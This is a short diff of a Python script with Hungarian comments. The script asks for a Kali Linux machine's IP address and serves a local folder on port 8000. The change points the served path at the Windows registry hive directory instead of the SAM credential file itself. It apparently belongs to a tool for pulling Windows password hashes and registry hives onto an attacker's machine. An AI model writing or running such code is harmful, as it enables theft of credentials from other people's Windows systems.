@@ -6,7 +6,7 @@ import webbrowser
 kali_ip = input("Kérem, adja meg a Kali Linux gép IP címét: ")
 
 # A megadott mappa elérési útvonala, ahol a fájlokat megosztod
-mappa_utvonal = 'C:\Windows\System32\config\SAM'  # Itt add meg a mappa elérési útvonalát
+mappa_utvonal = 'C:\Windows\System32\config'  # Itt add meg a mappa elérési útvonalát
 
 # Portszám, amelyen a szerver fut
 port = 8000
